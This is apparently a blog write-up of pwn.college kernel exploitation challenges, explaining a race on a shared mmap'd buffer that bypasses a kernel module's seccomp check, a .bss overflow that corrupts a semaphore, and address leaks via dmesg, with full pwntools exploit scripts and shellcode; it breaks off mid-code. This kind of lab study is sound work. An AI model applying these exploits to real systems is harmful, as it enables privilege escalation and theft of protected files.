---
layout: post
title:  "Pwn College - System Exploitation"
date:   2024-05-24 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

This module aims to be the "final boss" of the SBX, races and kernel security modules. \
Unfortunately, I think it misses its potential **big time**. All of the challenges within this module relies on the exact same kernel vuln. While its exploitation requires somewhat sophisticated thinking, involving races, userspace interactions, and few tricks, the exact same exploitation is being applied to all challenges. The only difference between them, is how to trigger this exploit. \
Sometimes there are canaries, sometimes certain syscalls are blocked, sometimes connections are sequal. However - all of these are userspace mitigations, requiring the old known userspace tricks. There is literally zero extra interaction with the kernel, which is a huge miss. \
I personally think this module is 99% waste of time, and as opposed to previous modules, teaches literally nothing new. 

## Background

For all challenges, we're given a suid userspace program, as well as a kernel module. The driver creates an interesting procfs entry, `ypu` - which stands for "yan processing unit". It contains few multiple operations, including `device_ioctl, device_open, device_release` and `device_mmap`. \
The `open` handler of the device simply stores buffer within the `private_data` of the device, allocated by `vmalloc_user`. This means that this memory area is actually mapped to userspace, not kernel. The equivalent `release` handler just `vfree`s that data. \
The `mmap` handler calls `remap_vmalloc_range` to the newly-allocated chunk within `file->private_data`. This simply maps the pages, allocated by `vmalloc`, to userspace `vma`. 

### vma

Recall `struct vm_area_struct` represents contiguous VA area, meaning a single entry within `/proc/pid/maps`. The `vma`'s of a single task are stored within `struct mm`. Moreover, they are also chained via the `vma->next` member. \
Moreover, a driver that supports `mmap` operation must initialize its associated `vma`, and to map it to some pages. It can be further read [here][linux-kernel-labs-vma] and [here][litux-vma]. 

### device_mmap

From a driver's point of view, the `mmap` facility allows direct memory access from userspace. This is interesting - It means that the underlying physical pages may be accessed both by the `vma`'s virtual addresses (`vma->start` up to `vma->end` - which are the real userspace addresses), as well as the driver's VA, which is returned by the kernel allocator (for example, via `vmalloc_user`). \
The driver allocates memory (via `kmalloc, vmalloc, alloc_pages`), and then maps it to user address space via helper functions, such as `remap_pfn_range, remap_vmalloc_range`. \
To obtain the page frame number of physical memory, consider how memory allocation was performed:

1. For `kmalloc`, `pfn = virt_to_phys(addr) >> PAGE_SHIFT`

2. For `vmalloc`, `pfn = vmalloc_to_pfn(addr)`

3. For `alloc_pages`, `pfn = page_to_pfn(addr)`

Recall that userspace mapped pages may be swapped out. Therefore, we must set `PG_reserved` bit on the allocated page, done by `SetPageReserved, ClearPageReserved`. 

### Kernel `struct file` API

The kernel offers dedicated API to interact with files, in a similar manner to `open, read, write`. There might be cases where we'd like our driver to interact with files on the filesystem, and this is a possible approach we can do so, without navigating through userspace. \
The relevant methods are `filp_open`, which returns a `struct file *` instead of a file descriptor. `kernel_read` is a similar method, that operates on a `struct file *`, and stores its content within a kernel buffer. In a similar manner, `kernel_write` writes the content that was stored within a kernel buffer.

## Challenge 1

The userspace component of this challenge opens the driver's `fd`, and executes our shellcode. \
Our shellcode can only call `mmap, ioctl` on the device driver's `fd`. \
The `ioctl` handler is pretty interesting - it starts to execute yan-emulator inside the kernel, having its code segment initialized to the driver's `file->private_data`. Recall this memory was initialized by the module within `device_open`. Userspace may interact with this memory by mapping it via `mmap`, as the `device_mmap` handler assigns `file->private_data` to the requested userspace vma. \
In order for the `mmap` call to succeed, we must make sure `prot` corresponds to the device's protections, as presented within procfs. In our case:

```bash
$ ls -la /proc/ypu 
-rw-rw-rw- 1 root root 0 Sep 17 17:28 /proc/ypu
```

Hence `prot = PROT_READ | PROT_WRITE = 3`. Moreover, I've mapped this region as `MAP_SHARED = 1`, just because we can (and having the option for this region to be visible to other processes may only do good in terms of exploitation). I've set the requested `size = 0x1000`, as this is the size of the allocated `vmalloc` chunk, hence larger `vma` should not be supported. Lastly, I've set `addr = NULL`, so we would retrive any userspace address the OS chooses.

Because this challenge executes the yan emulator within kernelspace, I've used the wrapper methods I've wrote within different modules to generate yancode in a convenient manner. \
The exploit for this stage:

```python
# BINARY = glob('/challenge/toddler*')[0]
BINARY = '/challenge/toddlersys_level1.0'
# LIBC = '/challenge/lib/libc.so.6'
GDB_SCRIPT= '''
set follow-fork-mode child
set print elements 0
handle SIG33 nostop noprint

c
'''

context.arch = 'amd64'

@dataclass
class Regs:
    a = b'\x20'
    b = b'\x08'
    c = b'\x04'
    d = b''
    s = b''
    i = b''
    f = b''

@dataclass
class Opcodes:
    STM = b'\x20'
    IMM = b'\x02'
    ADD = b''
    CMP = b''
    JMP = b''
    LDM = b''
    STK = b''
    SYSCALL = b'\x04'

@dataclass
class Syscalls:
    OPEN = b'\x08'
    READ_CODE = b''
    READ_MEM = b'\x10'
    WRITE_MEM = b'\x02'
    SLEEP = b''
    EXIT = b''

def instruction(opcode, reg1, reg2):
    return reg1 + opcode + reg2

def compare(reg1, reg2):
    buffer = b''
    buffer += instruction(Opcodes.CMP, reg1, reg2)
    return buffer

def syscall(number, out_reg):
    return instruction(Opcodes.SYSCALL, number, out_reg)

def store_in_memory(addr, register):
    return instruction(Opcodes.STM, addr, register)

def load_from_memory(addr, register):
    return instruction(Opcodes.LDM, addr, value)

def write_register(register, value):
    assert(value < 0x100)
    return instruction(Opcodes.IMM, register, value.to_bytes(1, 'little'))

def jump_register(register, flags):
    buffer = b''
    buffer += instruction(Opcodes.JMP, flags, register)
    return buffer

def jump(addr, flags):
    buffer = b''
    buffer += write_register(Regs.s, addr)
    buffer += jump_register(Regs.s, flags)
    return buffer

def open_file(file_addr, flags=0, mode=0):
    buffer = b''
    buffer += write_register(register=Regs.a, value=file_addr)
    buffer += write_register(register=Regs.b, value=flags)  # O_RDONLY = 0 ; O_RDWR = 2
    buffer += write_register(register=Regs.c, value=mode)  # mode, Irrelevant
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer

def read_to_memory(fd, offset, count):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer

def write_from_memory(fd, offset, count):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer

def store_string(addr, string):
    assert(type(string) == bytes)
    buffer = b''
    for i, b in enumerate(string):
        buffer += write_register(Regs.a, b)
        buffer += write_register(Regs.b, addr + i)
        buffer += store_in_memory(addr=Regs.b, register=Regs.a)
    return buffer

SHELLCODE = '''
user_shellcode:
mov rdi, 0
mov rsi, 0x1000
mov rdx, 3
mov r10, 1
mov r8, 3
mov r9, 0
mov rax, 9
syscall

lea rbx, [rip + yancode_start]
mov rcx, 0

copy_loop:
mov dl, byte ptr[rbx + rcx]
mov byte ptr[rax + rcx], dl
inc rcx
cmp rcx, yancode_end - yancode_start
je done
jmp copy_loop

done:
mov rdi, 3
mov rsi, 1337
mov rax, 16
syscall

yancode_start:
{}

yancode_end:
nop
'''

def main():    
    debug = False
    # if debug:
    #     p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    # else:

    p = process(BINARY)
    
    flag_path = b'/flag\x00'
    flag_addr = 0
    max_size = 0x80
    out_file_path = b'/home/hacker/OUT\x00'
    out_file_addr = max_size
    
    with open(out_file_path[:-1], 'wb') as f:
        pass

    yancode = b''
    # Store "flag" in mem[0]
    yancode += store_string(addr=flag_addr, string=flag_path)
    # open("/flag", O_RDONLY, 0)
    yancode += open_file(file_addr=flag_addr)
    # read(fd, &mem[0], 0x50)
    yancode += read_to_memory(fd=Regs.a, offset=flag_addr, count=max_size)

    # Store out filename in mem[0x80]
    yancode += store_string(addr=out_file_addr, string=out_file_path)
    yancode += open_file(file_addr=out_file_addr, flags=2)
    yancode += write_from_memory(fd=Regs.a, offset=flag_addr, count=max_size)

    yan_asm = ''
    for b in yancode:
        yan_asm += f'.byte {hex(b)}\n'
    
    log.info(SHELLCODE.format(yan_asm))
    user_shellcode = asm(SHELLCODE.format(yan_asm))
    with open('gdb_input.bin', 'wb') as f:
        f.write(user_shellcode)
    
    p.send(user_shellcode)
    p.recvuntil(b'Executing shellcode!\n')

    p.interactive()


if __name__ == '__main__':
    main()
```

## Challenge 2

Now, in addition to `mmap, ioctl`, the userspace program may also perform `fork`. \
The kernel module now contains dedicated `yan85_seccomp` implementation. Before executing every instruction, it's being passed through the filter. The filter checks that the instruction is of type `syscall`, and if so - checks if its requested syscall type is either `read_code` or `read_memory`. My previous exploit uses `read_memory` syscall, as it must read the file's content, hence - we must find a way to either bypass or to find a vuln within that seccomp implementation. \
The following is the exact check that the kernel module performs:

```c
v3 = &state->code[state->regs.i];
if (v3->op & SYSCALL && (LOBYTE(a3) = a3 & (READ_CODE | READ_MEM), (_BYTE)a3) )
{
    state->signal = -42;
}
```

Where `state->code` is actually the allocated `vmalloc` memory region, that is exposed to userspace via `mmap`. While inspecting its disassembly carefully, we can note the following:

```c
add rax, [rdi +100h]  // v3 (current instruction)
mov dl, [rax + 1]  // Syscall type
test byte ptr [rax], 0x20  // Check for Opcode type == Syscall?
```

But recall the memory region content, denoted by `rax`, is actually controlled by userspace. In particular, since we can `mmap` this region to multiple users, with `MAP_SHARED`, multiple processes would be able to write towards this underlying memory region. If `P1` would request a blocked syscall type by the syscall filter, such as `Syscall.READ_MEM`, and at the same time, `P2` would constantly write to this exact instruction memory address the value of some garbage opcode, that is NOT a `Syscall`, the check might pass:

```bash
mov dl, [rax + 1]  # P1_kernel: dl = READ_MEM
mov [rax], FAKE_INST  # P2_user: write fake inst
test byte ptr [rax], 20h  # P1_kernel: [rax] != 0x20, check passes, flow continues
mov [rax], ORIG_INST  # P2_user: restore original inst
k_syscall()  # P1_kernel: executes desired syscall instruction! 
```

This means that by using `fork` within userspace, we can create a new process `P2`, that maps the same `ioctl` memory region as `MAP_SHARED`, constantly writing `0x20` and other garbage byte at the exact offset where the desired syscall to be bypass resides, within the yancode. \
By calling `fork` right after popping the shared map region within the userspace shellcode, we can achieve exactly this. 

```python
#!/bin/python

from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from tempfile import TemporaryFile
from pwn import *
import os, sys
import struct
import time
import shutil
import binascii
import signal
import array
import textwrap
import string
import logging
# BINARY = glob('/challenge/toddler*')[0]
BINARY = '/challenge/toddlersys_level2.0'
# LIBC = '/challenge/lib/libc.so.6'
GDB_SCRIPT= '''
set follow-fork-mode child
set print elements 0
handle SIG33 nostop noprint

c
'''

context.arch = 'amd64'
# libc = ELF(LIBC)
# libc_rop = ROP(LIBC, badchars=string.whitespace)

@dataclass
class Regs:
    a = b'\x04'
    b = b'\x02'
    c = b'\x08'
    d = b''
    s = b''
    i = b''
    f = b''

@dataclass
class Opcodes:
    STM = b'\x08'
    IMM = b'\x10'
    ADD = b''
    CMP = b''
    JMP = b''
    LDM = b''
    STK = b''
    SYSCALL = b'\x20'

@dataclass
class Syscalls:
    OPEN = b'\x01'
    READ_CODE = b''
    READ_MEM = b'\x10'
    WRITE_MEM = b'\x04'
    SLEEP = b''
    EXIT = b''

def instruction(opcode, reg1, reg2):
    return opcode + reg1 + reg2

def compare(reg1, reg2):
    buffer = b''
    buffer += instruction(Opcodes.CMP, reg1, reg2)
    return buffer

def syscall(number, out_reg):
    return instruction(Opcodes.SYSCALL, number, out_reg)

def store_in_memory(addr, register):
    return instruction(Opcodes.STM, addr, register)

def load_from_memory(addr, register):
    return instruction(Opcodes.LDM, addr, value)

def write_register(register, value):
    assert(value < 0x100)
    return instruction(Opcodes.IMM, register, value.to_bytes(1, 'little'))

def jump_register(register, flags):
    buffer = b''
    buffer += instruction(Opcodes.JMP, flags, register)
    return buffer

def jump(addr, flags):
    buffer = b''
    buffer += write_register(Regs.s, addr)
    buffer += jump_register(Regs.s, flags)
    return buffer

def open_file(file_addr, flags=0, mode=0):
    buffer = b''
    buffer += write_register(register=Regs.a, value=file_addr)
    buffer += write_register(register=Regs.b, value=flags)  # O_RDONLY = 0 ; O_RDWR = 2
    buffer += write_register(register=Regs.c, value=mode)  # mode, Irrelevant
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer

def read_to_memory(fd, offset, count):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer

def write_from_memory(fd, offset, count):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer

def store_string(addr, string):
    assert(type(string) == bytes)
    buffer = b''
    for i, b in enumerate(string):
        buffer += write_register(Regs.a, b)
        buffer += write_register(Regs.b, addr + i)
        buffer += store_in_memory(addr=Regs.b, register=Regs.a)
    return buffer

SHELLCODE = '''
user_shellcode:
mov rdi, 0
mov rsi, 0x1000
mov rdx, 3
mov r10, 1
mov r8, 3
mov r9, 0
mov rax, 9
syscall
mov [rip + saved_mmap_addr], rax

mov rax, 57
syscall
cmp rax, 0
jne parent

child:
mov rbx, [rip + saved_mmap_addr]
add rbx, 72
mov cl, 0x10
mov dl, 0x20

race_loop:
mov byte ptr [rbx], cl
mov byte ptr [rbx], dl
jmp race_loop

parent:
mov rax, [rip + saved_mmap_addr]
lea rbx, [rip + yancode_start]
mov rcx, 0

copy_loop:
mov dl, byte ptr[rbx + rcx]
mov byte ptr[rax + rcx], dl
inc rcx
cmp rcx, yancode_end - yancode_start
je done
jmp copy_loop

done:
mov rdi, 3
mov rsi, 1337
mov rax, 16
syscall
jmp done

yancode_start:
{}

yancode_end:
saved_mmap_addr:
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
'''

def main():     
    p = process(BINARY)
    
    flag_path = b'/flag\x00'
    flag_addr = 0
    flag_content_addr = flag_addr + len(flag_path)
    max_size = 0x80
    out_file_path = b'/home/hacker/OUT\x00'
    out_file_addr = max_size
    
    with open(out_file_path[:-1], 'wb') as f:
        pass

    yancode = b''
    # Store "flag" in mem[0]
    yancode += store_string(addr=flag_addr, string=flag_path)
    # open("/flag", O_RDONLY, 0)
    yancode += open_file(file_addr=flag_addr)
    # read(fd, &mem[0], 0x50)
    yancode += read_to_memory(fd=Regs.a, offset=flag_content_addr, count=max_size)

    # Store out filename in mem[0x80]
    yancode += store_string(addr=out_file_addr, string=out_file_path)
    yancode += open_file(file_addr=out_file_addr, flags=2)
    yancode += write_from_memory(fd=Regs.a, offset=flag_content_addr, count=max_size)

    yan_asm = ''
    for i, b in enumerate(yancode):
        yan_asm += f'.byte {hex(b)}\n'
        if (i % 3) == 0 and (b == int.from_bytes(Opcodes.SYSCALL, "little")):
            log.info(f'Syscall index is: {i} Type: {yancode[i + 1]}')
    
    log.info(SHELLCODE.format(yan_asm))
    user_shellcode = asm(SHELLCODE.format(yan_asm))
    with open('gdb_input.bin', 'wb') as f:
        f.write(user_shellcode)
    
    p.send(user_shellcode)
    p.recvuntil(b'Executing shellcode!\n')

    p.interactive()


if __name__ == '__main__':
    main()
```

Notice that the resulting `OUT` file's content always changes, and contains the flag only during certain time frames, due to the underlying memory buffer within the yan emulator is always being changed. While this issue can be addressed, It isn't worth my time. 

## Challenge 3

This challenge is very interesting, as it presents multiple `ypu`s exploitation. This means that the emulator now may be runned under multicore environment, exposing a whole new attack surface for kernel races. \
The userspace component launches a server, that supports unlimited parallel connections. Moreover, an array of 16 slots stores both `fd`s of open references to `/proc/ypu`, as well as `mmap`ed chunks of size `0x1000` each (mapped as `MAP_SHARED`). A seccomp filter is being set, allowing only calls for `set_robust_list, futex, read, write, close, mmap, mprotect, munmap, ioctl, madvise, accept, clone, exit, fcntl`. Finally, thread is being dispatched for every new connection, launching `challenge`. \
Each thread handler may perform multiple commands:

1. `load_program` - given `program_index`, reads from the client's socket up to `0x1000` bytes to store within a userspace buffer within the `.bss`. 

2. `init_ypu` - copies a userspace buffer loaded by `load_program` into an `mmap`ed address, within one of the 16 slots. 

3. `run_ypu` - Calls `ioctl` on the relevant `ypu_index`, triggering the corresponding yancode emulator within the kernel. 

Notice that the kernel's yancode emulator have its own seccomp implementation, which blocks `SYS_READ_CODE, SYS_READ_MEM`, as in challenge 2. \
But now, we can no longer perform the `fork` syscall from userspace. While the `clone` syscall isn't blocked, notice the narrow API we have - we CANNOT execute arbitrary userspace code anymore, but only launch yancode directly to the kernel. This means we have to exploit the kernel race vuln via other means. \
My end goal is one kernel thread to manipulate the desired offset of the yancode, while the other tries to dispatch the `SYS_READ_MEM` syscall. Notice how the emulator's state is being allocated:

```c
device_ioctl()
{
    vmstate_t state;
    ...
    while(v3)
    {
        state->memory = 0;
        --v3;
    }
    state.code = file->private_data;
}
```

This means there's a critical mismatch between memory and code allocations:

1. A new `state.memory[]` kernel buffer is being allocated for each kernel thread that reaches the `ioctl` handler. 

2. The **SAME** `state.code[]` kernel buffer is being used for all kernel threads that are referencing the same underlying `mmap`ed region (`ypu_index`). 

Because we can separate the procesdures of loading yancode to the emulator and executing it, my exploitation route is as follows:

1. Generate yancode that performs simple open-read-write shellcode, in a naive manner. Call in a non-ending loop the dispatcher of `run_ypu` on this thread, denoted by `T1`. 

2. Use the exact same yancode on `T2`, this time only calling `init_ypu` within a non-ending loop.

3. Generate a similar yancode, except the `SYSCALL` opcode of `SYS_READ_MEM` is switched to `IMM` opcode. This time, run `T3`, calling `init_ypu` with this new program within a non-ending loop. 

The above exploit means that there would be always only one thread, `T1`, that executes the yancode within the kernel. \
However, there are 2 separate writers from userspace - `T2, T3` - continiously swapping the byte of the goal syscall, bypassing the seccomp filter. 

In order to debug the userspace program, I've used the following script:

```bash
#!/bin/bash

PID=$(pgrep -f "challenge")
sudo gdb -p "$PID" -x /home/hacker/gdb_debug.gdb
```

```python
#!/bin/python

from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from tempfile import TemporaryFile
from pwn import *
import os, sys
import struct
import time
import shutil
import binascii
import signal
import array
import textwrap
import string
import logging
BINARY = '/challenge/toddlersys_level3.0'
GDB_SCRIPT= '''
set follow-fork-mode child
set print elements 0
handle SIG33 nostop noprint

c
'''

context.arch = 'amd64'
context.terminal = '/usr/bin/tmux'

@dataclass
class Regs:
    a = b'\x40'
    b = b'\x10'
    c = b'\x04'
    d = b''
    s = b''
    i = b''
    f = b''

@dataclass
class Opcodes:
    STM = b'\x40'
    IMM = b'\x01'
    ADD = b''
    CMP = b''
    JMP = b''
    LDM = b''
    STK = b''
    SYSCALL = b'\x08'

@dataclass
class Syscalls:
    OPEN = b'\x10'
    READ_CODE = b''
    READ_MEM = b'\x20'
    WRITE_MEM = b'\x02'
    SLEEP = b''
    EXIT = b''

def instruction(opcode, reg1, reg2):
    return reg2 + reg1 + opcode

def compare(reg1, reg2):
    buffer = b''
    buffer += instruction(Opcodes.CMP, reg1, reg2)
    return buffer

def syscall(number, out_reg):
    return instruction(Opcodes.SYSCALL, number, out_reg)

def store_in_memory(addr, register):
    return instruction(Opcodes.STM, addr, register)

def load_from_memory(addr, register):
    return instruction(Opcodes.LDM, addr, value)

def write_register(register, value):
    assert(value < 0x100)
    return instruction(Opcodes.IMM, register, value.to_bytes(1, 'little'))

def jump_register(register, flags):
    buffer = b''
    buffer += instruction(Opcodes.JMP, flags, register)
    return buffer

def jump(addr, flags):
    buffer = b''
    buffer += write_register(Regs.s, addr)
    buffer += jump_register(Regs.s, flags)
    return buffer

def open_file(file_addr, flags=0, mode=0):
    buffer = b''
    buffer += write_register(register=Regs.a, value=file_addr)
    buffer += write_register(register=Regs.b, value=flags)  # O_RDONLY = 0 ; O_RDWR = 2
    buffer += write_register(register=Regs.c, value=mode)  # mode, Irrelevant
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer

def read_to_memory(fd, offset, count, adjusted=False):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    if adjusted:
        buffer += instruction(Opcodes.IMM, Syscalls.READ_MEM, Regs.a)
    else:
        buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer

def write_from_memory(fd, offset, count):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer

def store_string(addr, string):
    assert(type(string) == bytes)
    buffer = b''
    for i, b in enumerate(string):
        buffer += write_register(Regs.a, b)
        buffer += write_register(Regs.b, addr + i)
        buffer += store_in_memory(addr=Regs.b, register=Regs.a)
    return buffer

def gen_yancode(adjusted=False):
    MAX_YANCODE_SIZE = 0x1000

    flag_path = b'/flag\x00'
    flag_addr = 0
    flag_content_addr = flag_addr + len(flag_path)
    max_size = 0x80
    out_file_path = b'/home/hacker/OUT\x00'
    out_file_addr = max_size
    
    with open(out_file_path[:-1], 'wb') as f:
        pass

    yancode = b''
    # Store "flag" in mem[0]
    yancode += store_string(addr=flag_addr, string=flag_path)
    # open("/flag", O_RDONLY, 0)
    yancode += open_file(file_addr=flag_addr)
    # read(fd, &mem[0], 0x50)
    yancode += read_to_memory(fd=Regs.a, offset=flag_content_addr, count=max_size, adjusted=adjusted)

    # Store out filename in mem[0x80]
    yancode += store_string(addr=out_file_addr, string=out_file_path)
    yancode += open_file(file_addr=out_file_addr, flags=2)
    yancode += write_from_memory(fd=Regs.a, offset=flag_content_addr, count=max_size)
    
    yancode += b'\x00' * (MAX_YANCODE_SIZE - len(yancode))
    return yancode
```

In order to acquire the flag, I've used the following oneliner:

```bash
while true; do cat ./OUT ; done
```

## Challenge 4

Now the userspace component contains mutexes. In particular, for every ypu instance, `sem_init` is being called, initializing its semaphore as a threads-smaphore with the value of `1`. Upon calling the `init_ypu, run_ypu` handlers, `sem_wait` and `sem_post` are being called. \
However, recall that the critical sections that are being locked are:

1. The `memcpy`, issued by `T2, T3`, that performs the write to the mmap'ed region

2. The `ioctl`, issued by `T1`. 

This means that while perfoming the `ioctl` handler, m`T1` executes at the kernel, and the lock is held. Hence, no other thread can change the content of the device's corresponding `mmap`ed region. \
Notice, however, that the lock is per-ypu. This means that there isn't synchronization between multiple different ypus within the kernel. However, since different ypus contain no shared memory regions, this wouldn't be possible to exploit. \
Therefore, I assume the exploitation route goes through first overwriting metadata regarding the semaphore (whether its content - such as the `counter` member, or its pointer within the `.bss` - so we would use different semaphore instances), then fallbacking to challenge-3. Since overwriting the counter of a semaphore (to some high value) should be simpler exloit, this is my current target. \

```bash
read_addr = &data + 0x1000 + 768 * i
semaphore_addr = &data + (384 + i) * 32

read_max = &data + 0x1000 + 768 * 15
semaphore_min = &data + 384 * 32
```

This means we can perform from userspace a linear `.bss` overflow of up to `15616 - 12288` bytes. If we'd like to overwrite the semaphore of ypu0, we'd have to supply `i = 15`, writing total of `384 * 32 - 768 * 15` padding bytes, and then overwriting the semaphore struct. Since the `counter` is actually stored within the first bytes of the semaphore object, we're good with supplying only 1 byte of overwrite. \
Lastly, in order to avoid the `mmap` array being corrupted by the `read` that corrupts the semaphore object, I've used an initial thread, `T0`, that all it does is to overwrite the semaphore and hang for the rest of bytes with `read`. 

```python
def main():    
    p = process(BINARY)

    input("waiting for input..")
    log.info("Exploit starts!")

    iterations = 10000000
    batch=100
    target_ypu = 0
    r1_program = 0
    r2_program = 1
    r3_program = 2
    yancode = gen_yancode()
    adjusted_yancode = gen_yancode(adjusted=True)

    r0 = remote('localhost', 1337)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    r3 = remote('localhost', 1337)

    # Overwrite semaphore counter
    buf = b'A' * (384 * 32 - 768 * 15)
    buf += b'\x80'  # new counter
    # buf += b'\x00' * (MAX_YANCODE_SIZE - len(buf))
    load_program(r0, 15, buf)

    # Load programs
    load_program(r1, r1_program, yancode)
    load_program(r2, r2_program, yancode)
    load_program(r3, r3_program, adjusted_yancode)
    # Load program for main thread
    init_ypu(r1, target_ypu, r1_program)

    # Execute race!
    # TODO: change yancode, so that it would verify 'p' resides with the buffer before writing it
    pid1 = os.fork()
    if pid1 == 0:
        # Child 1
        for _ in range(iterations):
            # log.info("Running r1..")
            run_ypu(r1, target_ypu, batch)
        os.kill(os.getpid(), signal.SIGKILL.value)
    else:
        # Parent    
        pid2 = os.fork()
        if pid2 == 0:
            # Child 2
            for _ in range(iterations):
                # log.info("Running r2..")
                init_ypu(r2, target_ypu, r2_program, batch)
            os.kill(os.getpid(), signal.SIGKILL.value)
        else:
            # Parent
            for _ in range(iterations):
                # log.info("Running r3..")
                init_ypu(r3, target_ypu, r3_program, batch)

    os.waitpid(pid1, 0)
    os.waitpid(pid2, 0)
    
    p.interactive()
```


## Challenge 5

This stage is similar to 3, but this time a whole new process, not thread, handles every new connection - one at a time. This means no new connection would be accepted, until the preceding child process have terminated (or sent some signal). Since the mapping was initialized via `MAP_SHARED`, the `mmap`'ed regions are STILL being shared.\
Moreover, `load_program` handler now loads the program to a process stack buffer, which is a total of size `256 * 16`. However, notice that since we can supply up to index `16`, theres a buffer overflow vuln here, as we can reach a total offset of `48 * 16 * 16`. In addition, this buffer seems uninitialized prior to calling `load_program` - hence we are able to leak its content, writing it to some `mmap`ed region. By carefully designing the yancode for this stage, we can easily write these bytes to some output file, having large stack leakage of our wish (including the stack's canary). \
Interestingly, according to `checksec`, the binary has an executable stack. This means that we can store our shellcode there, and to return into it. There's actually other good candidates besides the process's stack to store our shellcode at - all we have to obtain is a libc leakage. By doing so, we actually fallback to challenge 2 - where we could execute our desired shellcode, which included the `fork` syscall (this time we'll have to use `clone`, which is actually more generic). \
In order to obtain leaks, my first idea was to use the fact that the array in which `load_buffer` is being read to, is uninitialized. This means we can load uninitialized content as yancode into the kernel. My idea was to craft special leaking-yancode, that would read its own data and emit it to some file. However, after developing such code, I've noticed I'm only leaking kernel addresses for some reason. The reason behind this is simple - the loadead uninitalized bytes within `load_program` are being loaded to the emulator's code segment, not memory. Apparently there's another vuln within the driver, where the memory of the emulator isn't initialized either, hence we can leak kernel addresses.

```bash
$ hexdump -C LEAK
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000010  00 50 08 00 00 c9 ff ff  00 f0 ff 00 00 3d 00 00  |.P...........=..|
00000020  00 12 74 7c 80 88 ff ff  00 00 00 00 00 00 00 00  |..t|............|
```

But this isn't what I need. Instead, a much simpler approach to leak userspace addresses is to just crash a client program, and parsing `dmesg`:

```bash
[ 1091.739420] traps: toddlersys_leve[268] general protection fault ip:5604763c672f sp:7ffe9374fa18 error:0 in toddlersys_level5.0[5604763c5000+3000]
```

Another option is to read off `/dev/kmsg`. 

After obtaining the `ip, sp` leaks, we can easily craft userspace shellcode within another process, that mimics challenge-2 behavior using `clone`. I've created a small C program that all it does is calling `fork`, and `strace`d it:

```bash
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7efdf9343a10)
```

We learn the `fork` glibc wrapper actually uses the `clone` sycall under the hood. By inspecting its disassembly, I've noted that near its start, it does the following:

```bash
0x7fabf1d67f1c <__libc_fork+44>:     mov    r9,QWORD PTR fs:0x10
0x7fabf1d67f25 <__libc_fork+53>:     xor    r8d,r8d                                                                   
0x7fabf1d67f28 <__libc_fork+56>:     lea    r10,[r9+0x2d0]                                                            
0x7fabf1d67f2f <__libc_fork+63>:     xor    edx,edx                                                                   
0x7fabf1d67f31 <__libc_fork+65>:     xor    esi,esi
0x7fabf1d67f33 <__libc_fork+67>:     mov    edi,0x1200011
0x7fabf1d67f38 <__libc_fork+72>:     mov    eax,0x38
0x7fabf1d67f3d <__libc_fork+77>:     syscall
```

Or by inspecting `glibc-2.31` sources, the inlived function `arch_fork`:

```c
static inline pid_t
arch_fork (void *ctid)
{
  const int flags = CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD;
  long int ret;
#ifdef __ASSUME_CLONE_BACKWARDS
# ifdef INLINE_CLONE_SYSCALL
  ret = INLINE_CLONE_SYSCALL (flags, 0, NULL, 0, ctid);
}
```

This means the flags values is actually `0x1200011`, both `newsp, parent_tid` are set to `NULL`, and `tid = 0`. \
The only interesting caveat is figuring out how `child_tid`, the address within the TLS that contains the `tid` of a process, is located. But it is a known, constant offset within `fsbase`. Hence, all I did in my shellcode is to mimic `fork`'s behavior. Indeed, now a new process is correctly spawned. 

```python
#!/bin/python

from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from tempfile import TemporaryFile
from pwn import *
import os, sys
import struct
import time
import shutil
import binascii
import signal
import array
import textwrap
import string
import logging
BINARY = '/challenge/toddlersys_level5.0'
GDB_SCRIPT= '''
set follow-fork-mode child
set print elements 0
handle SIG33 nostop noprint

c
'''

context.arch = 'amd64'
context.terminal = '/usr/bin/tmux'
binary = ELF(BINARY)
MAX_YANCODE_SIZE = 0x1000


@dataclass
class Regs:
    a = b'\x20'
    b = b'\x08'
    c = b'\x02'
    d = b''
    s = b''
    i = b''
    f = b''

@dataclass
class Opcodes:
    STM = b'\x01'
    IMM = b'\x40'
    ADD = b''
    CMP = b'\x08'
    JMP = b''
    LDM = b''
    STK = b''
    SYSCALL = b'\x10'

@dataclass
class Syscalls:
    OPEN = b'\x10'
    READ_CODE = b''
    READ_MEM = b'\x04'
    WRITE_MEM = b'\x01'
    SLEEP = b''
    EXIT = b''

def instruction(opcode, reg1, reg2):
    return opcode + reg1 + reg2

def compare(reg1, reg2):
    buffer = b''
